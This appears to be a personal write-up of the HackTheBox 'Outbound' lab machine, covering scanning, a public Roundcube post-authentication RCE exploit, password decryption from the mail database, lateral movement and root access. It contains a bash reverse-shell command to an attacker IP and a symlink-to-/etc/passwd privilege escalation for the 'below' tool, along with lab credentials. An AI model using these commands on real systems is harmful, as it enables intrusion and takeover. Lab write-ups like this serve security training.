---
title: Outbound HTB Write-Up
machine_ip: 10.129.207.28
os: Linux
difficulty: Easy
my_rating: 6
tags:
  - writeup
references: "[[📚CTF Box Writeups]]"
date: 2025-10-10
---
## 🌐 Enumeration
```r
💀dh4bi@20k ~ ꞗ rustscan -a 10.129.207.28 -t 2000 -b 2000 --ulimit 5000 -- -A -sV -sC -Pn                                             💀dh4bi@20k 05:04:50 PM
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Exploring the digital landscape, one IP at a time.

[~] The config file is expected to be at "/home/dh4bi/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.207.28:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A -sV -sC -Pn" on ip 10.129.207.28
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-10 17:06 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:06
Completed NSE at 17:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:06
Completed NSE at 17:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:06
Completed NSE at 17:06, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:06
Completed Parallel DNS resolution of 1 host. at 17:06, 0.19s elapsed
DNS resolution of 1 IPs took 0.19s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:06
Scanning 10.129.207.28 [1 port]
Discovered open port 80/tcp on 10.129.207.28
Completed Connect Scan at 17:06, 0.10s elapsed (1 total ports)
Initiating Service scan at 17:06
Scanning 1 service on 10.129.207.28
Completed Service scan at 17:07, 7.78s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.207.28.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:07
Completed NSE at 17:07, 1.89s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:07
Completed NSE at 17:07, 0.38s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
Nmap scan report for 10.129.207.28
Host is up, received user-set (0.098s latency).
Scanned at 2025-10-10 17:06:57 PDT for 10s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.46 seconds
```

# Port 80
```r
💀dh4bi@20k ~ ꞗ whatweb http://10.129.207.28
http://10.129.207.28 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.207.28], RedirectLocation[http://mail.outbound.htb/], Title[302 Found], nginx[1.24.0]
ERROR Opening: http://mail.outbound.htb/ - no address for mail.outbound.htb
```
- Add `outbound.htb` and `mail.outbound.htb` to `/etc/hosts`
```r
💀dh4bi@20k ~ ꞗ whatweb http://10.129.207.28
http://10.129.207.28 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.207.28], RedirectLocation[http://mail.outbound.htb/], Title[302 Found], nginx[1.24.0]
http://mail.outbound.htb/ [200 OK] Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[roundcube_sessid], IP[10.129.207.28], JQuery, PasswordField[_pass], RoundCube, Script, Title[Roundcube Webmail :: Welcome to Roundcube Webmail], X-Frame-Options[sameorigin], nginx[1.24.0]
```
- This looks like PNPT exam
![[Pasted image 20251010171657.png]]
- Directories are enumerating:
```r
💀dh4bi@20k ~ ꞗ feroxbuster -k -u http://mail.outbound.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt -C 403,404,400,503,301 -x php,html,htm,asp,aspx,jsp,txt,bak,zip,tar.gz,old,inc,conf,config,log,db,json -t 200
                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.12.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mail.outbound.htb
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
 💢  Status Code Filters   │ [403, 404, 400, 503, 301]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.12.0
 💉  Config File           │ /home/dh4bi/.config/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, htm, asp, aspx, jsp, txt, bak, zip, tar.gz, old, inc, conf, config, log, db, json]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       97l      333w     5327c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       59l      224w     3594c http://mail.outbound.htb/181.tar.gz
200      GET       20l       52w      848c http://mail.outbound.htb/246.bak
200      GET       53l      220w     3548c http://mail.outbound.htb/241.bak
200      GET       20l       52w      848c http://mail.outbound.htb/225.zip
200      GET       38l       90w      853c http://mail.outbound.htb/skins/elastic/watermark.html
200      GET       53l      220w     3548c http://mail.outbound.htb/1969.tar.gz
200      GET       20l       52w      848c http://mail.outbound.htb/183.tar.gz
200      GET       28l      317w    12745c http://mail.outbound.htb/program/js/common.min.js
200      GET       36l      319w    13835c http://mail.outbound.htb/program/js/jstz.min.js
200      GET        2l       11w    34732c http://mail.outbound.htb/skins/elastic/images/favicon.ico
200      GET        6l      472w    29309c http://mail.outbound.htb/plugins/jqueryui/themes/elastic/jquery-ui.min.css
200      GET       59l      224w     3594c http://mail.outbound.htb/212.tar.gz
200      GET       36l     1539w    90926c http://mail.outbound.htb/program/js/jquery.min.js
200      GET        1l     3221w   121737c http://mail.outbound.htb/skins/elastic/styles/styles.min.css
200      GET        6l     2100w   160347c http://mail.outbound.htb/skins/elastic/deps/bootstrap.min.css
200      GET       35l     1169w   171633c http://mail.outbound.htb/program/js/app.min.js
200      GET      243l     2447w   262502c http://mail.outbound.htb/plugins/jqueryui/js/jquery-ui.min.js
200      GET       53l      220w     3548c http://mail.outbound.htb/2019.old
200      GET       20l       52w      848c http://mail.outbound.htb/379.htm
200      GET       20l       52w      848c http://mail.outbound.htb/404-error.htm
200      GET       76l      300w     4939c http://mail.outbound.htb/2d.txt
200      GET       76l      300w     4939c http://mail.outbound.htb/385.aspx
200      GET       76l      300w     4938c http://mail.outbound.htb/337.jsp
200      GET       76l      300w     4939c http://mail.outbound.htb/3dsecure.jsp
200      GET       11l       67w      888c http://mail.outbound.htb/skins/elastic/images/logo.svg
200      GET       76l      300w     4939c http://mail.outbound.htb/384.aspx
200      GET       53l      220w     3548c http://mail.outbound.htb/255.inc
200      GET       20l       52w      848c http://mail.outbound.htb/25fb8.old
200      GET       59l      224w     3594c http://mail.outbound.htb/519.html

```
- After updating `/etc/hosts` SSH reveals itself
```r
💀dh4bi@20k ~ ꞗ rustscan -a 10.129.207.28 -t 2000 -b 2000 --ulimit 5000 -- -A -sV -sC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/dh4bi/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.207.28:22
Open 10.129.207.28:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A -sV -sC -Pn" on ip 10.129.207.28
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-10 17:24 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:24
Completed NSE at 17:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:24
Completed NSE at 17:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:24
Completed NSE at 17:24, 0.00s elapsed
Initiating Connect Scan at 17:24
Scanning outbound.htb (10.129.207.28) [2 ports]
Discovered open port 22/tcp on 10.129.207.28
Discovered open port 80/tcp on 10.129.207.28
Completed Connect Scan at 17:24, 0.09s elapsed (2 total ports)
Initiating Service scan at 17:24
Scanning 2 services on outbound.htb (10.129.207.28)
Completed Service scan at 17:24, 6.42s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.207.28.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:24
Completed NSE at 17:24, 4.18s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:24
Completed NSE at 17:24, 0.56s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:24
Completed NSE at 17:24, 0.00s elapsed
Nmap scan report for outbound.htb (10.129.207.28)
Host is up, received user-set (0.086s latency).
Scanned at 2025-10-10 17:24:25 PDT for 11s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:24
Completed NSE at 17:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:24
Completed NSE at 17:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:24
Completed NSE at 17:24, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.36 seconds
```
- We also find more directories after some time:
```r
200      GET       20l       52w      848c http://mail.outbound.htb/advhtml_upload.htm
200      GET       20l       52w      848c http://mail.outbound.htb/advertisements.asp
200      GET       76l      300w     4939c http://mail.outbound.htb/adtrack.bak
200      GET       20l       52w      848c http://mail.outbound.htb/administration.config
200      GET       53l      220w     3548c http://mail.outbound.htb/advanced_search.txt
200      GET       53l      220w     3548c http://mail.outbound.htb/admin_login.json
```
- Use assumed breach creds
	- `tyler : LhKL1o9Nm3X2`
	- This lets us login
![[Pasted image 20251010175034.png]]
- No mail to enumerate but we can get the version and import contacts
- Rouncube Webmail 1.6.10
![[Pasted image 20251010175102.png]]
![[Pasted image 20251010175119.png]]
- We find a Post-Auth RCE exploit for this version! Get it and get shell
- MSFconsole is annoying so I find a github one
	- https://github.com/hakaioffsec/CVE-2025-49113-exploit/tree/main
## 🗝️ Initial Access

- We find a Post-Auth RCE exploit for this version! Get it and get shell
- MSFconsole is annoying so I find a github one
	- https://github.com/hakaioffsec/CVE-2025-49113-exploit/tree/main
```r
php cve-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'sh -i >& /dev/tcp/10.10.15.72/4444 0>&1'"
```
![[Pasted image 20251010180552.png]]
- Catch shell as `www-data`.
![[Pasted image 20251010180617.png]]
- Find more users and add to `users.txt`
![[Pasted image 20251010180812.png]]
- Linpeas found nothing
- Enumerating the `/var/www/html/roundcube/config` folder, we find a config file, `config.inc.php`, with `mysql` creds for user `roundcube:
	- `roundcube : RCDBPass2025`
![[Pasted image 20251010211513.png]]
- Login to mysql to enumerate more
```r
$ mysql -u roundcube -p
Enter password: RCDBPass2025
USE roundcube;
SELECT * FROM users;
SELECT * from session;
user_id	username	mail_host	created	last_login	failed_login	failed_login_counter	language	preferences
1	jacob	localhost	2025-06-07 13:55:18	2025-06-11 07:52:49	2025-06-11 07:51:32	1	en_US	a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2	mel	localhost	2025-06-08 12:04:51	2025-06-08 13:29:05	NULL	NULL	en_US	a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
3	tyler	localhost	2025-06-08 13:28:55	2025-10-11 04:19:40	2025-06-11 07:51:22	1	en_US	a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";}
sess_id	changed	ip	vars
6a5ktqih5uca6lj8vrmgh9v0oh	2025-06-08 15:46:40	172.17.0.1	bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
a0nhn8f9oqecidv47i6heo2tms	2025-10-11 04:19:40	172.17.0.1	dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJKNlpGY1YzUnFtajhOMk9tMTVpT3BiMEszY2lBT2lzMiI7
cgimonebc5a3dov5hstcpsjme3	2025-10-11 04:19:40	172.17.0.1	dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJpRUVmRGc1cEloODlxQjR5MnlwZG1tVURjYWp1OXRtaCI7
d6ldjm3e7mu4v555jrqb8t1mcn	2025-10-1

```
- We have hashes (definitely used a few nudges here)
- Using CyberChef and decoding base64 we can see `jacob` user password
	- `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`
![[Pasted image 20251010212638.png]]
- In that same config file we saw an encryption key used to decrypt users impa passwords. We will need that here
	- `rcmail-!24ByteDESkey*Str`
![[Pasted image 20251010213511.png]]
![[Pasted image 20251010213614.png]]
- After some research, I found out that roundcube uses **Triple-DES (DES-EDE3-CBC)** for its encryption so we head on over to `cyberchef.io` but before decrypting, we have to decode from base 64 to hex format so as to have a valid input to decode
	- FIRST 8 BYTES! are IV !!!!!
	- `2f b4 6f d3 40 3c 4e ec`
![[Pasted image 20251010214708.png]]
- then the input for when decoding will be the rest of the converted hex format
	- REST IS SECRET PASSWORD !!!!
![[Pasted image 20251010214829.png]]
- Above hex is missing `bf` at the end because I fogot to copy the `/`
- We now have another user's creds 
	- `jacob : 595mO8DmwGeD`
## Lateral Moverment
- change to `jacob` user 
![[Pasted image 20251010220759.png]]
- Enumerate users home folder we find `mail` folder with a mail message in an `INBOX` folder that contains `jacob`'s password... likely SSH
![[Pasted image 20251010220945.png]]
`jacob : gY4Wr3a1evp4`
- We can SSH as `jacob` now
![[Pasted image 20251010221028.png]]
- `user.txt` flag
![[Pasted image 20251010221211.png]]
`a91a7c2af135a62b500f0e534994aefd`
## ⚡ Privilege Escalation
- Jacob's sudo permissions
![[Pasted image 20251010221050.png]]
- Needed nudges here..
- `/usr/bin/below` privesc:
	- The line `(ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below — config*, !/usr/bin/below — debug*, !/usr/bin/below -d*`. Tells us that we can run all `/usr/bin/below` commands as root without a password, except for those that use the — config, — debug, or -d flags.
	- This part was a bit of a struggle for me to know what to do next, but eventually, once again, through the magical tool known as the internet, I was able to find a public CVE for the command
		- https://github.com/dollarboysushil/Linux-Privilege-Escalation-CVE-2025-27591?source=post_page-----40b9ceb9064a---------------------------------------
	- Long story short, by removing the error file `below` used for the root user, we can create a symbolic link between `error_root.log` and`/etc/passwd`. When we run `/usr/bin/below` as root, it tries to edit the `error_root.log`; however, it will edit `/etc/passwd`. Allowing us to make users with root privileges.
```r
rm -f /var/log/below/error_root.log

ln -s /etc/passwd /var/log/below/error_root.log

echo 'fakeroot::0:0:,,,:/root:/bin/bash' > payload

sudo /usr/bin/below 

cp payload /var/log/below/error_root.log && su fakeroot
```
![[Pasted image 20251010224508.png]]
- We are root! Now, get `root.txt` flag
![[Pasted image 20251010224646.png]]
`96537db16abf6cfe3360f5b9523067ed`